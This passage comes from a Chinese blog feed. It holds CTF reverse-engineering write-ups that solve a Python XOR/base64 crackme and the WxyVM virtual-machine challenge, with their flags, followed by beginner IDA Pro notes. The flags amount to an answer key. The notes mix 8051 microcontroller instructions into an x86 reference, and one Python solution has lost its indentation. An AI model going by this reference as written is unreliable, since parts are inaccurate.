class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(message)</span>:</span>                        <span class="comment">#def定义了一个encode模块的变量</span></span><br><span class="line">    s = <span class="string">''</span>                                  <span class="comment">#为了存入最后的目标串</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> message:                       <span class="comment">#ord()函数主要用来返回对应字符的ascii码</span></span><br><span class="line">        x = ord(i) ^ <span class="number">32</span>                     <span class="comment">#将输入的字符串中每个字符ascii码都与32进行异或运算</span></span><br><span class="line">        x = x + <span class="number">16</span>                          <span class="comment">#每个都加上16</span></span><br><span class="line">        s += chr(x)                         <span class="comment">#再将它们一个一个转为字符</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(s)              <span class="comment">#最后再将新串进行一次base64加密</span></span><br><span class="line"> </span><br><span class="line">correct = <span class="string">'XlNkVmtUI1MgXWBZXCFeKY+AaXNt'</span>    <span class="comment">#输入的串</span></span><br><span class="line">flag = <span class="string">''</span>                                   <span class="comment">#为了存入最后的目标串</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Input flag:'</span>                         <span class="comment">#屏幕提示信息 请输入flag</span></span><br><span class="line">flag = raw_input()                          <span class="comment">#获取输入</span></span><br><span class="line"><span class="keyword">if</span> encode(flag) == correct:                 <span class="comment">#如果加密后的flag与correct相同  输出correct</span></span><br><span class="line">                                                            </span><br><span class="line">    <span class="keyword">print</span> <span class="string">'correct'</span> </span><br><span class="line"><span class="keyword">else</span>:                                       <span class="comment">#否则输出wrong</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'wrong'</span></span><br></pre></td></tr></table></figure><p>分析代码可知，输入的Flag，要经过每个字符对应的ascii码与32进行异或运算，且加上16，再转换为ascii字符，最后再将新的flag字符串进行一次base64加密，与’XlNkVmtUI1MgXWBZXCFeKY+AaXNt’进行匹配。那么反过来，只要将’XlNkVmtUI1MgXWBZXCFeKY+AaXNt’进行base64解密，每个字符转换为ascii码，减去16，与32进行异或，再输出为字符即可获得flag。</p><p>我们用Swift语言进行实现(Swift的Base64我没搞定，有莫名其妙的BUG）</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> UIKit</span><br><span class="line"><span class="class"><span class="keyword">extension</span> <span class="title">Character</span>//扩充方法使字符转为<span class="title">ascii</span>码</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">toInt</span><span class="params">()</span></span> -&gt; <span class="type">Int</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> intFromCharacter:<span class="type">Int</span> = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> scalar <span class="keyword">in</span> <span class="type">String</span>(<span class="keyword">self</span>).unicodeScalars</span><br><span class="line">        &#123;</span><br><span class="line">            intFromCharacter = <span class="type">Int</span>(scalar.value)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> intFromCharacter</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> str:<span class="type">String</span> = <span class="string">"^SdVkT#S ]`Y\\!^)ism"</span></span><br><span class="line">    <span class="keyword">var</span> flag = <span class="string">" "</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> num = <span class="type">Character</span>(<span class="type">UnicodeScalar</span>((i.toInt()-<span class="number">16</span>)^<span class="number">32</span>)!)</span><br><span class="line">        flag += <span class="type">String</span>(num)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>也可以使用Python实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">correct =<span class="string">'XlNkVmtUI1MgXWBZXCFeKY+AaXNt'</span></span><br><span class="line">s = base64.b64decode(correct)</span><br><span class="line">flag =<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">i = chr((ord(i)<span class="number">-16</span>)^<span class="number">32</span>)</span><br><span class="line">flag += i </span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><p>可获得Flag：nctf{d3c0mpil1n9_PyC}</p><h3 id="4、WxyVM"><a href="#4、WxyVM" class="headerlink" title="4、WxyVM"></a>4、WxyVM</h3><p>用Winhex打开以后可以看出来是ELF文件，所以用Ghidra打开,在内存地址为004006e2的地方发现名为FUN_004006e3的函数，通过分析可以得知即为main函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">undefined8 <span class="title">FUN_004006e3</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> sVar1;</span><br><span class="line">  <span class="keyword">bool</span> bVar2;</span><br><span class="line">  <span class="keyword">int</span> local_c;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"[WxyVM 0.0.1]"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"input your flag:"</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>,&amp;DAT_00604b80);</span><br><span class="line">  FUN_004005b6();</span><br><span class="line">  sVar1 = <span class="built_in">strlen</span>(&amp;DAT_00604b80);</span><br><span class="line">  bVar2 = sVar1 == <span class="number">0x18</span>;</span><br><span class="line">  local_c = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (local_c &lt; <span class="number">0x18</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">int</span>)(<span class="keyword">char</span>)(&amp;DAT_00604b80)[(<span class="keyword">long</span>)local_c] != *(<span class="keyword">int</span> *)(&amp;DAT_00601060 + (<span class="keyword">long</span>)local_c * <span class="number">4</span>)) </span><br><span class="line">    &#123;</span><br><span class="line">      bVar2 = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    local_c = local_c + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (bVar2) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"correct"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"wrong"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以经过分析可以判断变换后的flag在601060处。函数的主体还是比较简单的，现在需要对输入之后的4005b6函数进行分析。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">sub_4005B6</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// ST04_4</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">14999</span>; i += <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = byte_6010C0[i];</span><br><span class="line">    v3 = byte_6010C0[i + <span class="number">2</span>];</span><br><span class="line">    result = v0;</span><br><span class="line">    <span class="keyword">switch</span> ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        result = byte_6010C0[i + <span class="number">1</span>];</span><br><span class="line">        *(&amp;byte_604B80 + result) += v3;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        result = byte_6010C0[i + <span class="number">1</span>];</span><br><span class="line">        *(&amp;byte_604B80 + result) -= v3;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        result = byte_6010C0[i + <span class="number">1</span>];</span><br><span class="line">        *(&amp;byte_604B80 + result) ^= v3;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        result = byte_6010C0[i + <span class="number">1</span>];</span><br><span class="line">        *(&amp;byte_604B80 + result) *= v3;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        result = byte_6010C0[i + <span class="number">1</span>];</span><br><span class="line">        *(&amp;byte_604B80 + result) ^= *(&amp;byte_604B80 + byte_6010C0[i + <span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数是对一个比较长的数组进行操作6010c0处的数组进行操作，一共有15000个数据，每三个为一组，v0决定进行什么操作，v2用来寻址操作，v3作为操作数利用这个函数对已知的数据进行逆运算就能够得到最终的输入结果了。这里要注意对已知数据进行逆向的时候计数的时候也要倒着计数，从14999~0</p><h3 id="9-注意！！！"><a href="#9-注意！！！" class="headerlink" title="9.注意！！！"></a>9.注意！！！</h3><blockquote><p>再次重申，请不要未经同意便盗用我们的题目，如果有使用的需要，请和我们联系，联系方式已经在notice已经给出.flag{zhaowomen}</p></blockquote><p>可获得Flag：flag{zhaowomen}</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>菜鸟IdaPro入门笔记</title>
      <link href="/2019/09/14/Pro%E2%95%9A%CE%B4%E2%94%9C%E2%94%BC%E2%96%92%E2%95%A9%E2%95%9D%E2%95%9F/"/>
      <url>/2019/09/14/Pro%E2%95%9A%CE%B4%E2%94%9C%E2%94%BC%E2%96%92%E2%95%A9%E2%95%9D%E2%95%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="开始界面"><a href="#开始界面" class="headerlink" title="开始界面"></a>开始界面</h2><h6 id="New（新建）"><a href="#New（新建）" class="headerlink" title="New（新建）"></a>New（新建）</h6><h6 id="Go（运行）"><a href="#Go（运行）" class="headerlink" title="Go（运行）"></a>Go（运行）</h6><h6 id="Previous（上一个）"><a href="#Previous（上一个）" class="headerlink" title="Previous（上一个）"></a>Previous（上一个）</h6><h2 id="主界面工作区"><a href="#主界面工作区" class="headerlink" title="主界面工作区"></a>主界面工作区</h2><h6 id="IDA-View-A-反汇编窗口"><a href="#IDA-View-A-反汇编窗口" class="headerlink" title="IDA View-A 反汇编窗口"></a>IDA View-A 反汇编窗口</h6><h6 id="HexView-A-十六进制格式显示的窗口"><a href="#HexView-A-十六进制格式显示的窗口" class="headerlink" title="HexView-A 十六进制格式显示的窗口"></a>HexView-A 十六进制格式显示的窗口</h6><h6 id="Imports-导入表（程序中调用到的外面的函数）"><a href="#Imports-导入表（程序中调用到的外面的函数）" class="headerlink" title="Imports 导入表（程序中调用到的外面的函数）"></a>Imports 导入表（程序中调用到的外面的函数）</h6><h6 id="Functions-函数表（这个程序中的函数）"><a href="#Functions-函数表（这个程序中的函数）" class="headerlink" title="Functions 函数表（这个程序中的函数）"></a>Functions 函数表（这个程序中的函数）</h6><h6 id="Structures-结构"><a href="#Structures-结构" class="headerlink" title="Structures 结构"></a>Structures 结构</h6><h6 id="Enums-枚举"><a href="#Enums-枚举" class="headerlink" title="Enums 枚举"></a>Enums 枚举</h6><h2 id="IDA-View-A反汇编窗口"><a href="#IDA-View-A反汇编窗口" class="headerlink" title="IDA View-A反汇编窗口"></a>IDA View-A反汇编窗口</h2><h5 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h5><h6 id="AX-BX-CX-DX——通用寄存器"><a href="#AX-BX-CX-DX——通用寄存器" class="headerlink" title="AX BX CX DX——通用寄存器"></a>AX BX CX DX——通用寄存器</h6><h6 id="CS——代码段寄存器"><a href="#CS——代码段寄存器" class="headerlink" title="CS——代码段寄存器"></a>CS——代码段寄存器</h6><h6 id="IP——指令指针寄存器"><a href="#IP——指令指针寄存器" class="headerlink" title="IP——指令指针寄存器"></a>IP——指令指针寄存器</h6><h6 id="DS——段地址寄存器"><a href="#DS——段地址寄存器" class="headerlink" title="DS——段地址寄存器"></a>DS——段地址寄存器</h6><h6 id="SS——栈段寄存器"><a href="#SS——栈段寄存器" class="headerlink" title="SS——栈段寄存器"></a>SS——栈段寄存器</h6><h6 id="SP——栈偏移寄存器"><a href="#SP——栈偏移寄存器" class="headerlink" title="SP——栈偏移寄存器"></a>SP——栈偏移寄存器</h6><h6 id="IEAX——”累加器”-accumulator-它是很多加法乘法指令的缺省寄存器。"><a href="#IEAX——”累加器”-accumulator-它是很多加法乘法指令的缺省寄存器。" class="headerlink" title="IEAX——”累加器”(accumulator), 它是很多加法乘法指令的缺省寄存器。"></a>IEAX——”累加器”(accumulator), 它是很多加法乘法指令的缺省寄存器。</h6><h6 id="EBX——”基地址”-base-寄存器-在内存寻址时存放基地址。"><a href="#EBX——”基地址”-base-寄存器-在内存寻址时存放基地址。" class="headerlink" title="EBX——”基地址”(base)寄存器, 在内存寻址时存放基地址。"></a>EBX——”基地址”(base)寄存器, 在内存寻址时存放基地址。</h6><h6 id="ECX——计数器-counter-是重复-REP-前缀指令和LOOP指令的内定计数器。"><a href="#ECX——计数器-counter-是重复-REP-前缀指令和LOOP指令的内定计数器。" class="headerlink" title="ECX——计数器(counter), 是重复(REP)前缀指令和LOOP指令的内定计数器。"></a>ECX——计数器(counter), 是重复(REP)前缀指令和LOOP指令的内定计数器。</h6><h6 id="EDX——被用来放整数除法产生的余数。"><a href="#EDX——被用来放整数除法产生的余数。" class="headerlink" title="EDX——被用来放整数除法产生的余数。"></a>EDX——被用来放整数除法产生的余数。</h6><h6 id="ESI-EDI——分别叫做”源-目标索引寄存器”-source-destination-index-因为在很多字符串操作指令中，-DS-ESI指向源串-而ES-EDI指向目标串。"><a href="#ESI-EDI——分别叫做”源-目标索引寄存器”-source-destination-index-因为在很多字符串操作指令中，-DS-ESI指向源串-而ES-EDI指向目标串。" class="headerlink" title="ESI/EDI——分别叫做”源/目标索引寄存器”(source/destination index),因为在很多字符串操作指令中， DS:ESI指向源串,而ES:EDI指向目标串。"></a>ESI/EDI——分别叫做”源/目标索引寄存器”(source/destination index),因为在很多字符串操作指令中， DS:ESI指向源串,而ES:EDI指向目标串。</h6><h6 id="EBP——”基址指针”-BASE-POINTER-它最经常被用作高级语言函数调用的”框架指针”-frame-pointer-。"><a href="#EBP——”基址指针”-BASE-POINTER-它最经常被用作高级语言函数调用的”框架指针”-frame-pointer-。" class="headerlink" title="EBP——”基址指针”(BASE POINTER), 它最经常被用作高级语言函数调用的”框架指针”(frame pointer)。"></a>EBP——”基址指针”(BASE POINTER), 它最经常被用作高级语言函数调用的”框架指针”(frame pointer)。</h6><h6 id="ESP——专门用作堆栈指针，被形象地称为栈顶指针，堆栈的顶部是地址小的区域，压入堆栈的数据越多，ESP也就越来越小。在32位平台上，ESP每次减少4字节。"><a href="#ESP——专门用作堆栈指针，被形象地称为栈顶指针，堆栈的顶部是地址小的区域，压入堆栈的数据越多，ESP也就越来越小。在32位平台上，ESP每次减少4字节。" class="headerlink" title="ESP——专门用作堆栈指针，被形象地称为栈顶指针，堆栈的顶部是地址小的区域，压入堆栈的数据越多，ESP也就越来越小。在32位平台上，ESP每次减少4字节。"></a>ESP——专门用作堆栈指针，被形象地称为栈顶指针，堆栈的顶部是地址小的区域，压入堆栈的数据越多，ESP也就越来越小。在32位平台上，ESP每次减少4字节。</h6><h5 id="资料转移指令"><a href="#资料转移指令" class="headerlink" title="资料转移指令"></a>资料转移指令</h5><p>######MOV——移动</p><p>######MOVC——程式记忆体移动 </p><p>######MOVX——外部RAM和扩展I/O口与寄存器A的数据传送指令</p><h6 id="PUSH——放入堆栈"><a href="#PUSH——放入堆栈" class="headerlink" title="PUSH——放入堆栈"></a>PUSH——放入堆栈</h6><h6 id="POP——由堆叠取回"><a href="#POP——由堆叠取回" class="headerlink" title="POP——由堆叠取回"></a>POP——由堆叠取回</h6><h6 id="XCH——8位元交换"><a href="#XCH——8位元交换" class="headerlink" title="XCH——8位元交换"></a>XCH——8位元交换</h6><h6 id="XCHD——低4位元交换"><a href="#XCHD——低4位元交换" class="headerlink" title="XCHD——低4位元交换"></a>XCHD——低4位元交换</h6><h6 id="SWAP——高低4位元交换"><a href="#SWAP——高低4位元交换" class="headerlink" title="SWAP——高低4位元交换"></a>SWAP——高低4位元交换</h6><h5 id="算术指令"><a href="#算术指令" class="headerlink" title="算术指令"></a>算术指令</h5><h6 id="ADD——两数相加"><a href="#ADD——两数相加" class="headerlink" title="ADD——两数相加"></a>ADD——两数相加</h6><h6 id="ADDC——两数相加再加C"><a href="#ADDC——两数相加再加C" class="headerlink" title="ADDC——两数相加再加C"></a>ADDC——两数相加再加C</h6><h6 id="SUBB——两数相减再减C"><a href="#SUBB——两数相减再减C" class="headerlink" title="SUBB——两数相减再减C"></a>SUBB——两数相减再减C</h6><h6 id="INC——加一指令"><a href="#INC——加一指令" class="headerlink" title="INC——加一指令"></a>INC——加一指令</h6><h6 id="DEC——减一指令"><a href="#DEC——减一指令" class="headerlink" title="DEC——减一指令"></a>DEC——减一指令</h6><h6 id="MUL——（MUL-AB乘法指令仅此一条）相乘指令，所得的16位二进制数低8位存累加器A高8位存B"><a href="#MUL——（MUL-AB乘法指令仅此一条）相乘指令，所得的16位二进制数低8位存累加器A高8位存B" class="headerlink" title="MUL——（MUL AB乘法指令仅此一条）相乘指令，所得的16位二进制数低8位存累加器A高8位存B"></a>MUL——（MUL AB乘法指令仅此一条）相乘指令，所得的16位二进制数低8位存累加器A高8位存B</h6><h6 id="DIV——（DIV-AB-除法指令仅此一条）相除指令，所得商存A，余数存B"><a href="#DIV——（DIV-AB-除法指令仅此一条）相除指令，所得商存A，余数存B" class="headerlink" title="DIV——（DIV AB 除法指令仅此一条）相除指令，所得商存A，余数存B"></a>DIV——（DIV AB 除法指令仅此一条）相除指令，所得商存A，余数存B</h6><h5 id="控制转移类指令"><a href="#控制转移类指令" class="headerlink" title="控制转移类指令"></a>控制转移类指令</h5><h6 id="JC——C-1时跳"><a href="#JC——C-1时跳" class="headerlink" title="JC——C=1时跳"></a>JC——C=1时跳</h6><h6 id="JNC——C-0时跳"><a href="#JNC——C-0时跳" class="headerlink" title="JNC——C=0时跳"></a>JNC——C=0时跳</h6><h6 id="JB——位元-1时跳"><a href="#JB——位元-1时跳" class="headerlink" title="JB——位元=1时跳"></a>JB——位元=1时跳</h6><h6 id="JNB——位元-0时跳"><a href="#JNB——位元-0时跳" class="headerlink" title="JNB——位元=0时跳"></a>JNB——位元=0时跳</h6><h6 id="JBC——位元-1时跳且清除此位元"><a href="#JBC——位元-1时跳且清除此位元" class="headerlink" title="JBC——位元=1时跳且清除此位元"></a>JBC——位元=1时跳且清除此位元</h6><h6 id="LCALL——长调用子程序"><a href="#LCALL——长调用子程序" class="headerlink" title="LCALL——长调用子程序"></a>LCALL——长调用子程序</h6><h6 id="ACALL——绝对调用子程序"><a href="#ACALL——绝对调用子程序" class="headerlink" title="ACALL——绝对调用子程序"></a>ACALL——绝对调用子程序</h6><h6 id="RET——由副程式返回"><a href="#RET——由副程式返回" class="headerlink" title="RET——由副程式返回"></a>RET——由副程式返回</h6><h6 id="RETI——由中断副程式返回"><a href="#RETI——由中断副程式返回" class="headerlink" title="RETI——由中断副程式返回"></a>RETI——由中断副程式返回</h6><h6 id="AJMP——绝对转移"><a href="#AJMP——绝对转移" class="headerlink" title="AJMP——绝对转移"></a>AJMP——绝对转移</h6><h6 id="SJMP——相对转移"><a href="#SJMP——相对转移" class="headerlink" title="SJMP——相对转移"></a>SJMP——相对转移</h6><h6 id="JMP——-A-DPTR-散转，相对DPTR的间接转移"><a href="#JMP——-A-DPTR-散转，相对DPTR的间接转移" class="headerlink" title="JMP——@A+DPTR 散转，相对DPTR的间接转移"></a>JMP——@A+DPTR 散转，相对DPTR的间接转移</h6><h6 id="JZ——A-0时跳"><a href="#JZ——A-0时跳" class="headerlink" title="JZ——A=0时跳"></a>JZ——A=0时跳</h6><h6 id="JNZA——0时跳"><a href="#JNZA——0时跳" class="headerlink" title="JNZA——0时跳"></a>JNZA——0时跳</h6><h6 id="CJNE——二数比较-不相等时跳"><a href="#CJNE——二数比较-不相等时跳" class="headerlink" title="CJNE——二数比较,不相等时跳"></a>CJNE——二数比较,不相等时跳</h6><h6 id="DJNZ——减一-不等於0时跳"><a href="#DJNZ——减一-不等於0时跳" class="headerlink" title="DJNZ——减一,不等於0时跳"></a>DJNZ——减一,不等於0时跳</h6><h6 id="NOP——空操作"><a href="#NOP——空操作" class="headerlink" title="NOP——空操作"></a>NOP——空操作</h6><h5 id="位变量指令"><a href="#位变量指令" class="headerlink" title="位变量指令"></a>位变量指令</h5><h6 id="SETB——设定为1ORG-程序开始，规定程序的起始地址"><a href="#SETB——设定为1ORG-程序开始，规定程序的起始地址" class="headerlink" title="SETB——设定为1ORG 程序开始，规定程序的起始地址"></a>SETB——设定为1ORG 程序开始，规定程序的起始地址</h6><h6 id="END——程序结束"><a href="#END——程序结束" class="headerlink" title="END——程序结束"></a>END——程序结束</h6><h6 id="EQU——等值指令（先赋值后使用）例：SUM-EQU-30H"><a href="#EQU——等值指令（先赋值后使用）例：SUM-EQU-30H" class="headerlink" title="EQU——等值指令（先赋值后使用）例：SUM EQU 30H"></a>EQU——等值指令（先赋值后使用）例：SUM EQU 30H</h6><h6 id="DB——定义字节指令"><a href="#DB——定义字节指令" class="headerlink" title="DB——定义字节指令"></a>DB——定义字节指令</h6><h6 id="DW——定义字内容"><a href="#DW——定义字内容" class="headerlink" title="DW——定义字内容"></a>DW——定义字内容</h6><h6 id="DS——定义保留一定的存贮单元数目"><a href="#DS——定义保留一定的存贮单元数目" class="headerlink" title="DS——定义保留一定的存贮单元数目"></a>DS——定义保留一定的存贮单元数目</h6><h6 id="BIT——位地址符号指令-例：SAM-BIT-P1-0"><a href="#BIT——位地址符号指令-例：SAM-BIT-P1-0" class="headerlink" title="BIT——位地址符号指令 例：SAM BIT P1.0"></a>BIT——位地址符号指令 例：SAM BIT P1.0</h6><h6 id="RET——子程序返回指令"><a href="#RET——子程序返回指令" class="headerlink" title="RET——子程序返回指令"></a>RET——子程序返回指令</h6><h6 id="RETI——中断子程序返回指令-本条指令地址"><a href="#RETI——中断子程序返回指令-本条指令地址" class="headerlink" title="RETI——中断子程序返回指令$ 本条指令地址"></a>RETI——中断子程序返回指令$ 本条指令地址</h6><h2 id="IDA快捷键"><a href="#IDA快捷键" class="headerlink" title="IDA快捷键"></a>IDA快捷键</h2><h6 id="空格键——反汇编窗口切换文本跟图形"><a href="#空格键——反汇编窗口切换文本跟图形" class="headerlink" title="空格键——反汇编窗口切换文本跟图形"></a>空格键——反汇编窗口切换文本跟图形</h6><h6 id="ESC——退到上一个操作地址"><a href="#ESC——退到上一个操作地址" class="headerlink" title="ESC——退到上一个操作地址"></a>ESC——退到上一个操作地址</h6><h6 id="G——搜索地址或者符号"><a href="#G——搜索地址或者符号" class="headerlink" title="G——搜索地址或者符号"></a>G——搜索地址或者符号</h6><h6 id="N——重命名"><a href="#N——重命名" class="headerlink" title="N——重命名"></a>N——重命名</h6><h6 id="；——注释"><a href="#；——注释" class="headerlink" title="；——注释"></a>；——注释</h6><h6 id="ALT-M——添加标签"><a href="#ALT-M——添加标签" class="headerlink" title="ALT+M——添加标签"></a>ALT+M——添加标签</h6><h6 id="CTRL-M——列出所有标签"><a href="#CTRL-M——列出所有标签" class="headerlink" title="CTRL+M——列出所有标签"></a>CTRL+M——列出所有标签</h6><h6 id="CTRL-S——二进制段的开始地址结束地址"><a href="#CTRL-S——二进制段的开始地址结束地址" class="headerlink" title="CTRL +S——二进制段的开始地址结束地址"></a>CTRL +S——二进制段的开始地址结束地址</h6><h6 id="C-code——光标地址出内容解析成代码"><a href="#C-code——光标地址出内容解析成代码" class="headerlink" title="C code——光标地址出内容解析成代码"></a>C code——光标地址出内容解析成代码</h6><h6 id="P——在函数开始处使用P，从当前地址处解析成函数"><a href="#P——在函数开始处使用P，从当前地址处解析成函数" class="headerlink" title="P——在函数开始处使用P，从当前地址处解析成函数"></a>P——在函数开始处使用P，从当前地址处解析成函数</h6><h6 id="D——data解析成数据"><a href="#D——data解析成数据" class="headerlink" title="D——data解析成数据"></a>D——data解析成数据</h6><h6 id="A——ASCII解析成ASCII"><a href="#A——ASCII解析成ASCII" class="headerlink" title="A——ASCII解析成ASCII"></a>A——ASCII解析成ASCII</h6><h6 id="U——unDefined解析成未定义的内容"><a href="#U——unDefined解析成未定义的内容" class="headerlink" title="U——unDefined解析成未定义的内容"></a>U——unDefined解析成未定义的内容</h6><h6 id="X——交叉引用"><a href="#X——交叉引用" class="headerlink" title="X——交叉引用"></a>X——交叉引用</h6><h6 id="F5——C伪代码"><a href="#F5——C伪代码" class="headerlink" title="F5——C伪代码"></a>F5——C伪代码</h6><h6 id="ALT-T——搜索文本"><a href="#ALT-T——搜索文本" class="headerlink" title="ALT+T——搜索文本"></a>ALT+T——搜索文本</h6><h6 id="ALT-B——搜索16进制-搜索opcode"><a href="#ALT-B——搜索16进制-搜索opcode" class="headerlink" title="ALT+B——搜索16进制 搜索opcode"></a>ALT+B——搜索16进制 搜索opcode</h6><h6 id="CTRL-ALT-B——打开断点列表"><a href="#CTRL-ALT-B——打开断点列表" class="headerlink" title="CTRL+ALT+B——打开断点列表"></a>CTRL+ALT+B——打开断点列表</h6><h6 id="F7——单步步入"><a href="#F7——单步步入" class="headerlink" title="F7——单步步入"></a>F7——单步步入</h6><h6 id="F8——单步不过"><a href="#F8——单步不过" class="headerlink" title="F8——单步不过"></a>F8——单步不过</h6><h6 id="CTRL-F7——运行到函数返回地址"><a href="#CTRL-F7——运行到函数返回地址" class="headerlink" title="CTRL+F7——运行到函数返回地址"></a>CTRL+F7——运行到函数返回地址</h6><h6 id="F4——运行到光标处"><a href="#F4——运行到光标处" class="headerlink" title="F4——运行到光标处"></a>F4——运行到光标处</h6><table><thead><tr><th>窗口名称</th><th>快捷键</th></tr></thead><tbody><tr><td>Names Window</td><td>Shift+F4</td></tr><tr><td>Functions Window</td><td>Shift+F3</td></tr><tr><td>Strings Window</td><td>Shift+F12</td></tr><tr><td>Segments</td><td>Shift+F7</td></tr><tr><td>Segment 